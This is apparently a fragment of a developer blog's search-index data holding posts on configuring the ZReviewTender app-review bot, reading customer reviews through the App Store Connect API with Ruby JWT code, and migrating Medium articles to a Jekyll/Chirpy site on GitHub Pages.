slackTimeZoneOffset: \"+08:00\" # Review Created Date TimeZone slackAttachmentGroupByNumber: \"1\" # 1~100, how many review messages in 1 slack message. slackBotToken: \"\" # Slack Bot Token, send slack message through Slack Bot. slackBotTargetChannel: \"\" # Slack Bot Token, send slack message through Slack Bot. (recommended, first priority) slackInCommingWebHookURL: \"\" # Slack Incoming WebHook URL, send slack message through Incoming WebHook, not recommended, deprecated. ...More Processors...ZReviewTender comes with four Processors. Their order affects the data processing flow: FilterProcessor -&gt; GoogleTranslateProcessor -&gt; SlackProcessor -&gt; GoogleSheetProcessor.FilterProcessor:Filter and retrieve reviews based on specified conditions, processing only the reviews that meet the criteria. class: FilterProcessor requires no changes, points to lib/Processors/ FilterProcessor.rb enable: true / false Enable this Processor or not keywordsInclude: [‚Äú keyword1 ‚Äù,‚Äú keyword2 ‚Äù‚Ä¶] Filter reviews containing these keywords ratingsInclude: [ 1 , 2 ‚Ä¶] Filter reviews that include these rating scores from 1 to 5 territoriesInclude: [‚Äú zh-hant ‚Äù,‚Äù TWN ‚Äù‚Ä¶] Filter reviews that include these regions (Apple) or languages (Android) GoogleTranslateProcessor:Translate the reviews into the specified language. class: GoogleTranslateProcessor does not require changes, it refers to lib/Processors/GoogleTranslateProcessor.rb enable: true / false Enable or disable this Processor googleTranslateAPIKeyFilePath: /gcp_key.json The GCP Service Account credential key file path *.json. Place the file in the same folder as the config yml. For an example, see the Google Play Console JSON key above.(Ensure the service account in the JSON key has Cloud Translation API access permission) googleTranslateTargetLang: zh-TW, en ‚Ä¶ Target translation languages googleTranslateTerritoriesExclude: [‚Äú zh-hant ‚Äù,‚Äù TWN ‚Äù‚Ä¶] Regions (Apple) or languages (Android) that do not require translation SlackProcessor:Forward reviews to Slack. class: SlackProcessor does not need adjustment, it points to lib/Processors/SlackProcessor.rb enable: true / false Enable this Processor or not slackTimeZoneOffset: +08:00 Time zone for displaying review time slackAttachmentGroupByNumber: 1 sets how many Reviews are combined into one message to speed up sending; default is 1 Review per Slack message. slackBotToken: xoxb-xxxx-xxxx-xxxx Slack Bot Token, Slack recommends creating a Slack Bot with the postMessages scope and using it to send Slack messages slackBotTargetChannel: CXXXXXX group ID ( not the group name ), the Slack Bot will send messages to this Channel group; and you need to add your Slack Bot to this group slackInCommingWebHookURL: https://hooks.slack.com/services/XXXXX Use the old Incoming WebHookURL to send messages to Slack. Note! Slack no longer recommends using this method to send messages. Please note, this is a legacy custom integration ‚Äî an outdated method for teams to integrate with Slack. These integrations lack newer features and will be deprecated and possibly removed in the future. We do not recommend using them. Instead, we suggest you check out their replacement: Slack apps. slackBotToken and slackInCommingWebHookURL, SlackProcessor will prioritize using slackBotTokenGoogleSheetProcessorRecord reviews to Google Sheet. class: GoogleSheetProcessor does not need adjustment, points to lib/Processors/ SlackProcessor.rb enable: true / false Enable this Processor or not googleSheetAPIKeyFilePath: /gcp_key.json GCP Service Account credential key file path *.json. Place the file in the same directory as the config yml. For the content example, refer to the Google Play Console JSON key example above.(Please ensure the service account in the JSON key has permissions for Google Sheets API and Google Drive API) googleSheetTimeZoneOffset: +08:00 Review time display timezone googleSheetID: Google Sheet IDCan be obtained from the Google Sheet URL: https://docs.google.com/spreadsheets/d/ googleSheetID / googleSheetName: Sheet name, e.g. Sheet1 keywordsInclude: [‚Äú keyword1 ‚Äù,‚Äú keyword2 ‚Äù‚Ä¶] Filter reviews containing these keywords ratingsInclude: [ 1 , 2 ‚Ä¶] Filter reviews that include these rating scores from 1 to 5 territoriesInclude: [‚Äú zh-hant ‚Äù,‚Äù TWN ‚Äù‚Ä¶] Filter reviews that include these regions (Apple) or languages (Android) values: [ ] Combination of fields for review information %TITLE% Review Title%BODY% Review Content%RATING% Rating Score 1~5%PLATFORM% Review Source Platform Apple or Android%ID% Review ID%USERNAME% Reviewer%URL% Review Link%TERRITORY% Review Region (Apple) or Review Language (Android)%APPVERSION% Rated App Version%CREATEDDATE% Review Creation DateFor example, my Google Sheet columns are as follows:Rating Score,Review Title,Review Content,Review InformationThe values can be set to:values: [\"%TITLE%\",\"%BODY%\",\"%RATING%\",\"%PLATFORM% - %APPVERSION%\"]Custom Processor Integration with Your Own WorkflowIf you need to customize the Processor, please use manual deployment, as the ZReviewTender on the gem is packaged and cannot be adjusted dynamically.You can refer to lib/Processors/ProcessorTemplate.rb to create your extension:$lib = File.expand_path('../lib', File.dirname(__FILE__))require \"Models/Review\"require \"Models/Processor\"require \"Helper\"require \"ZLogger\"# Add to config.yml:## processors:# - ProcessorTemplate:# class: \"ProcessorTemplate\"# parameter1: \"value\"# parameter2: \"value\"# parameter3: \"value\"# ...#class ProcessorTemplate &lt; Processor def initialize(config, configFilePath, baseExecutePath) # init Processor # get parameter from config e.g. config[\"parameter1\"] # configFilePath: file path of config file (apple.yml/android.yml) # baseExecutePath: user execute path end def processReviews(reviews, platform) if reviews.length &lt; 1 return reviews end ## do what you want to do with reviews... ## return result reviews return reviews endendinitialize will provide: config Object: Corresponds to the settings in the config yml file configFilePath: Path to the config yml file used baseExecutePath: The path where the user runs ZReviewTender processReviews(reviews, platform):After scraping new reviews, this function is called to give the Processor a chance to handle them. Please return the processed Reviews after completion.Review data structure is defined in lib/Models/ Review.rbNoteXXXterritorXXX Parameters: Apple Usage Regions: TWM/JPN‚Ä¶ Android Language Settings: zh-hant/en/‚Ä¶ If a Processor is not needed:You can set enable: false or simply remove the Processor Config Block.Processors execution order can be adjusted according to your needs:e.g. Run Filter first, then Translation, followed by Slack, and finally Log to Google Sheet‚Ä¶Execution ‚ö†Ô∏è Using the Gem, you can run ZReviewTender directly. For manually deployed projects, please use bundle exec ruby bin/ZReviewTender to execute.Generate Configuration File:ZReviewTender -iGenerate apple.yml and android.yml from apple.example.yml and android.example.yml into the config/ directory in the current working directory.Execute Apple &amp; Android Review Scraping:ZReviewTender -r Default reads the apple.yml &amp; android.yml settings under /config/Execute Apple &amp; Android Review Scraping &amp; Specify Profile Directory:ZReviewTender --run=config directory Default reads apple.yml &amp; android.yml settings under /config/Only execute Apple review scraping:ZReviewTender -a Default reads the apple.yml configuration under /config/Only Execute Apple Review Crawling &amp; Specify Profile Location:ZReviewTender --apple=apple.yml configuration file locationRun Android Review Scraping Only:ZReviewTender -g Default reads the android.yml configuration under /config/Only Execute Android Review Scraping &amp; Specify Profile Location:ZReviewTender --googleAndroid=path_to_android.yml_configuration_fileClear Execution Records and Reset to Default SettingsZReviewTender -dIt will delete the Timestamp record file in /latestCheckTimestamp, returning to the initial state. Running the crawl again will receive the init success message:Current ZReviewTender VersionZReviewTender -vDisplay the current latest version number of ZReviewTender on RubyGem.Update ZReviewTender to the Latest Version (rubygem only)ZReviewTender -nFirst ExecutionThe first successful run will send an initialization success message to the specified Slack Channel and create latestCheckTimestamp/Apple and latestCheckTimestamp/Android files in the execution directory to record the last fetched review timestamps.An execute.log file will also be generated to record execution errors.Set Schedule for Continuous ExecutionSet a scheduled task ( crontab ) to continuously crawl new reviews. ZReviewTender will crawl new reviews from the last crawl timestamp latestCheckTimestamp up to the current crawl time and update the timestamp record file.e.g. crontab: 15 */6 * * * ZReviewTender -rAlso, note that the Android API only allows querying reviews added or edited within the last 7 days, so schedule cycles should not exceed 7 days to avoid missing any reviews.https://developers.google.com/android-publisher/reply-to-reviews#retrieving_a_set_of_reviewsGithub Action DeploymentZReviewTender App Reviews Automatic Botname: ZReviewTenderon: workflow_dispatch: schedule: - cron: \"15 */6 * * *\" # Runs every six hours, you can refer to the crontab above to adjust the schedulejobs: ZReviewTender: runs-on: ubuntu-latest steps: - name: ZReviewTender Automatic Bot uses: ZhgChgLi/ZReviewTender@main with: command: '-r' # Execute Apple &amp; iOS App review check, you can change to other commands as shown above‚ö†Ô∏èÔ∏èÔ∏èÔ∏èÔ∏è Warning Again!Be sure to keep your configuration files and keys private, as sensitive information may lead to App/Slack permission misuse; the author is not responsible for any misuse.If an unexpected error occurs, please create an Issue and include the log information. It will be fixed as soon as possible!DoneThe tutorial ends here. Next is a behind-the-scenes development secret sharing.=========================The War with App ReviewsI thought last year‚Äôs summary of AppStore APP‚Äôs Reviews Slack Bot Stories and the related technology implementation of ZReviewsBot ‚Äî Slack App Review Notification Bot, along with integrating the latest app reviews into the company workflow, had come to an end; unexpectedly, Apple updated the App Store Connect API this year (../f1365e51902c/), allowing this process to continue evolving.The solution for extracting reviews from Apple iOS/macOS Apps summarized last year: Public URL API (RSS) ‚ö†Ô∏è: Limited filtering options, provides minimal information, has quantity limits, and we occasionally encounter data inconsistencies, making it unstable; the official service may be discontinued in the future. Using Fastlane ‚Äî SpaceShip, we encapsulate complex web operations and session management to fetch review data from the App Store Connect backend (essentially running a web emulator crawler to scrape data from the backend). According to last year‚Äôs method, only Method Two can be used to achieve this, but the results are not ideal; the session expires and requires manual periodic renewal, and it cannot be placed on a CI/CD server because the session expires immediately if the IP changes.important-note-about-session-duration by FastlaneAfter receiving the news that Apple updated the App Store Connect API this year, I immediately started redesigning the new review bot. Besides switching to the official API, I also optimized the previous architecture and became more familiar with Ruby usage.Issues Encountered in Developing with App Store Connect API List All Customer Reviews for an App This endpoint does not provide app version informationIt‚Äôs strange that the only workaround is to first call this endpoint to filter the latest reviews, then call List All App Store Versions for an App &amp; List All Customer Reviews for an App Store Version to combine the app version information.Issues Encountered in AndroidpublisherV3 Development The API does not provide a method to retrieve all review lists; it can only fetch reviews added or edited within the last 7 days. Using JWT to Connect to Google API (Without Relying on Related Libraries e.g. google-apis-androidpublisher_v3) Here is an example of generating and using a Google API JWT: require \"jwt\"require \"time\"payload = { iss: \"client_email field in GCP API service account key (*.json) file\", sub: \"client_email field in GCP API service account key (*.json) file\", scope: [\"https://www.googleapis.com/auth/androidpublisher\"].join(' '), aud: \"token_uri field in GCP API service account key (*.json) file\", iat: Time.now.to_i, exp: Time.now.to_i + 60*20}rsa_private = OpenSSL::PKey::RSA.new(\"private_key field in GCP API service account key (*.json) file\")token = JWT.encode payload, rsa_private, 'RS256', header_fields = {kid:\"private_key_id field in GCP API service account key (*.json) file\", typ:\"JWT\"}uri = URI(\"token_uri field in GCP API service account key (*.json) file\")https = Net::HTTP.new(uri.host, uri.port)https.use_ssl = truerequest = Net::HTTP::Post.new(uri)request.body = \"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Ajwt-bearer&amp;assertion=#{token}\"response = https.request(request).read_bodybearer = result[\"access_token\"]### use bearer tokenuri = URI(\"https://androidpublisher.googleapis.com/androidpublisher/v3/applications/APP_PACKAGE_NAME/reviews\")https = Net::HTTP.new(uri.host, uri.port)https.use_ssl = true request = Net::HTTP::Get.new(uri)request['Authorization'] = \"Bearer #{bearer}\"; response = https.request(request).read_body result = JSON.parse(response)# success!If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "App Store Connect API: Manage Customer Reviews and Subscriptions Efficiently", "url": "/posts/zrealm-dev/app-store-connect-api-manage-customer-reviews-and-subscriptions-efficiently-f1365e51902c/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, app-store-connect, api, app-review, integration", "date": "2022-07-20 22:50:44 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!App Store Connect API Now Supports Reading and Managing Customer ReviewsApp St...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!App Store Connect API Now Supports Reading and Managing Customer ReviewsApp Store Connect API 2.0+ Complete Update, Supporting In-app Purchases, Subscriptions, and Customer Reviews Management2022/07/19 NewsUpcoming transition from the XML feed to the App Store Connect APIThis morning, I received the latest news from Apple Developer. The App Store Connect API now supports managing In-app Purchases, Subscriptions, and Customer Reviews. This allows developers to integrate Apple‚Äôs development process more flexibly and efficiently with CI/CD or business backends!In-app purchases and Subscriptions I haven‚Äôt touched, but Customer Reviews excite me greatly. I previously published an article titled ‚ÄúAppStore APP‚Äôs Reviews Slack Bot ÈÇ£‰∫õ‰∫ã‚Äù exploring the integration of app reviews with workflow.Slack Review Bot ‚Äî ZReviewsBotBefore the App Store Connect API was supported, there were only two ways to get iOS App reviews:1. Obtained through subscribing to Public RSS, but this RSS lacks flexible filtering, provides limited information, has quantity limits, and we occasionally encounter data inconsistencies, making it unstable.2. Using Fastlane ‚Äî SpaceShip to handle complex web operations and session management for us, fetching review data from the App Store Connect backend (essentially acting as a web emulator crawler to scrape data from the backend). The advantage is complete and stable data; we have integrated it for a year without any data issues. The downside is that the session expires every month and requires manual re-login. Also, Apple ID now universally requires 2FA verification, so this step must be done manually to generate a valid session. Additionally, if the IP used to create the session differs from the IP used later, the session will expire immediately (making it difficult to run the bot on networks with dynamic IPs). important-note-about-session-duration by Fastlane It expires irregularly every month, so you need to update it from time to time, which becomes really annoying over time; moreover, this ‚ÄúKnow How‚Äù is actually hard to hand over to other colleagues. But since there was no other way, it had to be this way until I received news this morning‚Ä¶. ‚ö†Ô∏è Note: The official XML (RSS) access method is planned to be discontinued in November 2022.2022/08/10 UpdateI have developed a new ‚ÄúZReviewTender ‚Äî Free Open Source App Reviews Monitoring Bot‚Äù based on the new App Store Connect API.App Store Connect API 2.0+ Customer Reviews Trial PlayCreate App Store Connect API KeyFirst, log in to the App Store Connect backend, go to ‚ÄúUsers and Access‚Äù -&gt; ‚ÄúKeys‚Äù -&gt; ‚ÄúApp Store Connect API‚Äù:Click the ‚Äú+‚Äù button, enter the name and permissions; for detailed permission rules, refer to the official website. To minimize testing issues, select ‚ÄúApp Manager‚Äù here to grant the highest level of permissions.Click ‚ÄúDownload API Key‚Äù on the right to download and save your ‚ÄúAuthKey_XXX.p8‚Äù key. ‚ö†Ô∏è Note: This key can only be downloaded once, so please keep it safe. If lost, you can only revoke the existing one and create a new one. ‚ö†Ô∏è ‚ö†Ô∏è Do Not Leak the .p8 Key File ‚ö†Ô∏èApp Store Connect API Access Methodscurl -v -H 'Authorization: Bearer [signed token]' \"https://api.appstoreconnect.apple.com/v1/apps\"Signed Token (JWT, JSON Web Token) Generation MethodRefer to the official documentation. JWT Header:{kid:\"YOUR_KEY_ID\", typ:\"JWT\", alg:\"ES256\"}YOUR_KEY_ID: Refer to the image above. JWT Payload:{ iss: 'YOUR_ISSUE_ID', iat: TOKEN creation time (UNIX TIMESTAMP e.g 1658326020), exp: TOKEN expiration time (UNIX TIMESTAMP e.g 1658327220), aud: 'appstoreconnect-v1'}YOUR_ISSUE_ID: Refer to the image above.exp TOKEN expiration time: The expiration time varies depending on the access function or setting. Some can be permanent, while others expire after more than 20 minutes and require regeneration. For details, please refer to the official documentation.Use JWT.IO or the Ruby example below to generate a JWTjwt.rb:require 'jwt'require 'time'keyFile = File.read('./AuthKey_XXXX.p8') # YOUR .p8 private key file pathprivateKey = OpenSSL::PKey::EC.new(keyFile)payload = { iss: 'YOUR_ISSUE_ID', iat: Time.now.to_i, exp: Time.now.to_i + 60*20, aud: 'appstoreconnect-v1' }token = JWT.encode payload, privateKey, 'ES256', header_fields={kid:\"YOUR_KEY_ID\", typ:\"JWT\"}puts tokendecoded_token = JWT.decode token, privateKey, true, { algorithm: 'ES256' }puts decoded_token Ruby JWT tool is here: https://github.com/jwt/ruby-jwtThe final result will be a JWT similar to the following:4oxjoi8j69rHQ58KqPtrFABBWHX2QH7iGFyjkc5q6AJZrKA3AcZcCFoFMTMHpM.pojTEWQufMTvfZUW1nKz66p3emsy2v5QseJX5UJmfRjpxfjgELUGJraEVtX7tVg6aicmJT96q0snP034MhfgoZAB46MGdtC6kv2Vj6VeL2geuXG87Ys6ADijhT7mfHUcbmLPJPNZNuMttcc.fuFAJZNijRHnCA2BRqq7RZEJBB7TLsm1n4WM1cW0yo67KZp-Bnwx9y45cmH82QPAgKcG-y1UhRUrxybi5b9iNNTry it out?With the token, we can now try using the App Store Connect API!curl -H 'Authorization: Bearer JWT' \"https://api.appstoreconnect.apple.com/v1/apps/APPID/customerReviews\" APPID can be obtained from the App Store Connect backend:Or the App Store page: https://apps.apple.com/tw/app/pinkoi/id557252416 APPID = 557252416 Success! üöÄ We can now fetch App reviews using this method. The data is complete and can be fully handled by the machine without manual routine maintenance (although the JWT expires, the Private Key does not, so we can generate a JWT signed with the Private Key for each request to access the data). For other filter parameters and operation methods, please refer to the official documentation. ‚ö†Ô∏è You can only access app review data for which you have permission ‚ö†Ô∏èComplete Ruby Test ProjectUsing a Ruby file, the above process is implemented. You can directly clone it and fill in the data for testing.First Open:bundle installGetting Started:bundle exec ruby jwt.rbNextSimilarly, we can access and manage through the API ( API Overview ): [New] Customer reviews [New] Subscriptions [New] In-App Purchases [New] Xcode Cloud Workflows And Builds [Updated] Improving your App‚Äôs Performance TestFlight Users And Roles App Clips App Management App Metadata Pricing And Availability Provisioning Sales and Trends If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Seamlessly Migrate Medium Content to Self-Hosted SitesÔΩúGithub Pages with Jekyll/Chirpy", "url": "/posts/zrealm-dev/seamlessly-migrate-medium-content-to-self-hosted-sites-github-pages-with-jekyll-chirpy-a0c08d579ab1/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, jekyll, github-actions, medium, self-hosted", "date": "2022-07-17 00:00:47 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Seamless Migration from Medium to a Self-Hosted WebsiteMoving Medium Content t...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Seamless Migration from Medium to a Self-Hosted WebsiteMoving Medium Content to Github Pages (with Jekyll/Chirpy)zhgchg.liBackgroundIn my fourth year of running Medium, I have accumulated over 65 articles and nearly 1000+ hours of effort. The reason I chose Medium initially was its simplicity and convenience, allowing me to focus on writing without worrying about other issues. Before this, I tried self-hosting WordPress, but I spent most of my time dealing with the environment, themes, and plugins. No matter how I adjusted, I was never satisfied. After making changes, I found the loading speed too slow, the reading experience poor, and the backend writing interface not user-friendly, so I stopped updating it frequently.As I wrote more articles on Medium and gained some traffic and followers, I started wanting to control these achievements myself, rather than being controlled by a third-party platform (e.g., losing everything if Medium shuts down). So, since the year before last, I have been looking for a secondary backup website. I will continue to maintain Medium but also publish content simultaneously on a site I control. The solution I found back then was ‚Äî Google Site but honestly, it can only serve as a personal ‚Äúportal‚Äù site. The article writing interface is limited and cannot fully transfer all my articles.In the end, I returned to self-hosting, but instead of using a dynamic website (e.g., WordPress), I chose a static website. Although it supports fewer features, what I need is just the article writing function and a simple, smooth, customizable browsing experience‚Äînothing else!The workflow of a static website is: write articles in Markdown format locally, then convert them into static web pages using a static site generator and upload them to the server; done. Static web pages provide a fast browsing experience!Writing in Markdown format allows your article to be compatible with more platforms; if you‚Äôre not used to it, you can also find online or offline Markdown editors, which offer an experience similar to writing directly on Medium!In summary, this solution can achieve both the smooth browsing experience and the convenient writing interface I desire.Resultszhgchg.li Support Custom Display Styles Support customized page adjustments (e.g., inserting ads, JS widgets) Support Custom Pages Support Custom Domain Names Static pages load quickly and provide a smooth browsing experience Use Git version control to preserve and restore all historical versions of the article. Fully Automated Scheduled Sync of Medium Articles to Website 2025/01/18 Update üéâüéâüéâ Please refer to the Quick Start Guide for Medium to Jekyll Setup Please refer to the Quick Setup Guide for Medium to Jekyll Please refer to the quick setup guide for Medium to Jekyll Environment and Tools Environment Language: Ruby Dependency Management Tools: RubyGems.org, Bundler Static Site Generator: Jekyll (Based on Ruby) Article Format: Markdown Server: Github Page (Free, unlimited traffic/capacity static website server) CI/CD: Github Action (Free 2,000 mins+/month) Medium Article to Markdown Tool: ZMediumToMarkdown (Based on Ruby) Version Control: Git (Optional) Git GUI: Git Fork (Optional) Domain Service: Namecheap Installing RubyHere, I only use my environment as an example. For other operating system versions, please Google how to install Ruby. macOS Monterey 12.1 rbenv ruby 2.6.5 Install Brew/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"Enter the above command in Terminal to install Brew.Install rbenvbrew install rbenv ruby-buildAlthough MacOS comes with Ruby pre-installed, it is recommended to use rbenv to install a separate Ruby version to keep it isolated from the system default. Enter the above command in Terminal to install rbenv.rbenv initEnter the above command in Terminal to initialize rbenv Close &amp; Reopen Terminal.Type rbenv in the Terminal to check if the installation was successful!Success!Installing Ruby with rbenvrbenv install 2.6.5Enter the above command in Terminal to install Ruby version 2.6.5.rbenv global 2.6.5Enter the above command in Terminal to switch the Ruby version used by Terminal from the system default to the rbenv version.In the Terminal, type rbenv versions to check the current settings:In Terminal, enter ruby -v to check the current Ruby version, and gem -v to check the current RubyGems version: After installing Ruby, RubyGems should also be installed. Success!Install Jekyll &amp; Bundler &amp; ZMediumToMarkdowngem install jekyll bundler ZMediumToMarkdownEnter the above commands in Terminal to install Jekyll, Bundler, and ZMediumToMarkdown.Completed!Create a Jekyll Blog from a TemplateThe default Jekyll Blog style is very simple. We can find styles we like from the following websites and apply them: GitHub.com #jekyll-theme repos jamstackthemes.dev jekyllthemes.org jekyllthemes.io jekyll-themes.com The installation method generally uses gem-based themes. Some repositories offer installation via Fork; others provide one-click installation. In short, each theme may have a different installation method, so please refer to the theme‚Äôs instructions. Also note that since we are deploying to GitHub Pages, not all templates are supported according to the official documentation.Chirpy TemplateHere, I will use the template Chirpy adopted by my blog as an example. This template offers the simplest one-click installation method and can be used directly. Other templates rarely offer similar one-click installation. For those unfamiliar with Jekyll or GitHub Pages, using this template first is a better way to get started. Future articles may cover installation methods for other templates. Alternatively, you can find templates on Github that can be directly forked (e.g. al-folio) and used immediately. If none suit your needs and you have to manually install a template, you will need to figure out how to set up Github Pages deployment yourself. I tried researching this but was unsuccessful; I will update this article with my findings in the future.Create a Git Repo from a Git Templatehttps://github.com/cotes2020/chirpy-starter/generate Repository name: GithubUsername/OrganizationName.github.io ( Be sure to use this format ) Be sure to select ‚ÄúPublic‚Äù to make the Repo public. Click ‚ÄúCreate repository from template‚ÄùRepository creation completed.Git Clone Projectgit clone git@github.com:zhgchgli0718/zhgchgli0718.github.io.gitgit clone the newly created Repo.Run bundle to install dependencies:Run bundle lock ‚Äî add-platform x86_64-linux to lock the versionModify Website SettingsOpen the _config.yml configuration file to set up:# The Site Configuration# Import the themetheme: jekyll-theme-chirpy# Change the following value to '/PROJECT_NAME' ONLY IF your site type is GitHub Pages Project sites# and doesn't have a custom domain.# baseurl: ''# The language of the webpage ‚Ä∫ http://www.lingoes.net/en/translator/langcode.htm# If it has the same name as one of the files in folder `_data/locales`, the layout language will also be changed,# otherwise, the layout language will use the default value of 'en'.lang: en# Additional parameters for datetime localization, optional. ‚Ä∫ https://github.com/iamkun/dayjs/tree/dev/src/localeprefer_datetime_locale:# Change to your timezone ‚Ä∫ http://www.timezoneconverter.com/cgi-bin/findzone/findzonetimezone:# jekyll-seo-tag settings ‚Ä∫ https://github.com/jekyll/jekyll-seo-tag/blob/master/docs/usage.md# ‚Üì --------------------------title: ZhgChgLi # the main titletagline: Live a life you will remember. # it will display as the sub-titledescription: &gt;- # used by seo meta and the atom feed ZhgChgLi iOS Developer eager to learn, teaching and learning, loves movies/TV shows/Western music/sports/life# fill in the protocol &amp; hostname for your site, e.g., 'https://username.github.io'url: 'https://zhgchg.li'github: username: ZhgChgLi # change to your github usernametwitter: username: zhgchgli # change to your twitter usernamesocial: # Change to your full name. # It will be displayed as the default author of the posts and the copyright owner in the Footer name: ZhgChgLi email: zhgchgli@gmail.com # change to your email address links: - https://medium.com/@zhgchgli - https://github.com/ZhgChgLi - https://www.linkedin.com/in/zhgchgligoogle_site_verification: # fill in your verification string# ‚Üë --------------------------# The end of `jekyll-seo-tag` settingsgoogle_analytics: id: G-6WZJENT8WR # fill in your Google Analytics ID # Google Analytics pageviews report settings pv: proxy_endpoint: # fill in the Google Analytics superProxy endpoint of Google App Engine cache_path: # the local PV cache data, friendly to visitors from GFW region# Prefer color scheme setting.## Note: Keep empty will follow the system prefer color by default,# and there will be a toggle to switch the theme between dark and light# on the bottom left of the sidebar.## Available options:## light - Use the light color scheme# dark - Use the dark color scheme#theme_mode: # [light\\|dark]# The CDN endpoint for images.# Notice that once it is assigned, the CDN url# will be added to all image (site avatar &amp; posts' images) paths starting with '/'## e.g. 'https://cdn.com'img_cdn:# the avatar on sidebar, support local or CORS resourcesavatar: '/assets/images/zhgchgli.jpg'# boolean type, the global switch for ToC in posts.toc: truecomments: active: disqus # The global switch for posts comments, e.g., 'disqus'. Keep it empty means disable # The active options are as follows: disqus: shortname: zhgchgli # fill with the Disqus shortname. ‚Ä∫ https://help.disqus.com/en/articles/1717111-what-s-a-shortname # utterances settings ‚Ä∫ https://utteranc.es/ utterances: repo: # &lt;gh-username&gt;/&lt;repo&gt; issue_term: # &lt; url \\| pathname \\| title \\| ...&gt; # Giscus options ‚Ä∫ https://giscus.app giscus: repo: # &lt;gh-username&gt;/&lt;repo&gt; repo_id: category: category_id: mapping: # optional, default to 'pathname' input_position: # optional, default to 'bottom' lang: # optional, default to the value of `site.lang`# Self-hosted static assets, optional ‚Ä∫ https://github.com/cotes2020/chirpy-static-assetsassets: self_host: enabled: # boolean, keep empty means false # specify the Jekyll environment, empty means both # only works if `assets.self_host.enabled` is 'true' env: # [development\\|production]paginate: 10# ------------ The following options are not recommended to be modified ------------------kramdown: syntax_highlighter: rouge syntax_highlighter_opts: # Rouge Options ‚Ä∫ https://github.com/jneen/rouge#full-options css_class: highlight # default_lang: console span: line_numbers: false block: line_numbers: true start_line: 1collections: tabs: output: true sort_by: orderdefaults: - scope: path: '' # An empty string here means all files in the project type: posts values: layout: post comments: true # Enable comments in posts. toc: true # Display TOC column in posts. # DO NOT modify the following parameter unless you are confident enough # to update the code of all other post links in this project. permalink: /posts/:title/ - scope: path: _drafts values: comments: false - scope: path: '' type: tabs # see `site.collections` values: layout: page permalink: /:title/ - scope: path: assets/img/favicons values: swcache: true - scope: path: assets/js/dist values: swcache: truesass: style: compressedcompress_html: clippings: all comments: all endings: all profile: false blanklines: false ignore: envs: [development]exclude: - '*.gem' - '*.gemspec' - tools - README.md - LICENSE - gulpfile.js - node_modules - package*.jsonjekyll-archives: enabled: [categories, tags] layouts: category: category tag: tag permalinks: tag: /tags/:name/ category: /categories/:name/Please replace the settings with your own content according to the comments. ‚ö†Ô∏è Changes to _config.yml require restarting the local website to take effect!Preview WebsiteAfter dependency installation is complete,You can start the local site with bundle exec jekyll s:Copy the URL http://127.0.0.1:4000/ and paste it into your browser to open.Local Preview Successful!With this Terminal open, the local website stays running. The Terminal continuously updates the website access logs, making debugging easier.We can open a new Terminal to perform other subsequent operations.Jekyll Directory StructureDepending on the template, there may be different folders and configuration files. The article directory is at: _posts/: Articles will be placed in this directoryArticle file naming convention: YYYY ‚Äì MM ‚Äì DD - article-file-name.md assets/:Directory for website resources. Images used on the website or images within articles should be placed here. Other directories like _includes, _layouts, _sites, _tabs‚Ä¶ allow you to make advanced extensions and modifications.Jekyll uses Liquid as its page template engine. The page templates are composed in a way similar to inheritance:Users can freely customize pages. The engine first checks if the user has created a custom file for the page -&gt; if not, it checks the template -&gt; if not, it uses the original Jekyll style.So we can easily customize any page by simply creating a file with the same name in the corresponding directory!Create/Edit Article We can first delete all example article files under the _posts/ directory.Use Visual Code (free) or Typora (paid) to create a Markdown file. Here, we use Visual Code as an example: Article file naming convention: YYYY ‚Äì MM ‚Äì DD - ArticleFileName .md It is recommended to use English for file names (SEO optimization), as this name will become the URL path. Article Content Top Meta:---layout: posttitle: \"Hello\"description: ZhgChgLi's first articledate: 2022-07-16 10:03:36 +0800categories: Jeklly Lifeauthor: ZhgChgLitags: [ios]--- layout: post title: Article Title (og:title) description: Article description (og:description) date: Article publication date (cannot be in the future) author: Author (meta:author) tags: Tags (multiple allowed) categories: Categories (single, separate subcategories with spaces, e.g., Jeklly Life means the Life folder under the Jeklly directory) Please provide the Markdown paragraphs you want me to translate into English.Write using Markdown format:---layout: posttitle: \"Hello Hello\"description: ZhgChgLi's first articledate: 2022-07-16 10:03:36 +0800categories: Jeklly Lifeauthor: ZhgChgLitags: [ios]---# HiHi!Hello thereI am **ZhgChgLi**Image:![](/assets/post_images/DSC_2297.jpg){: 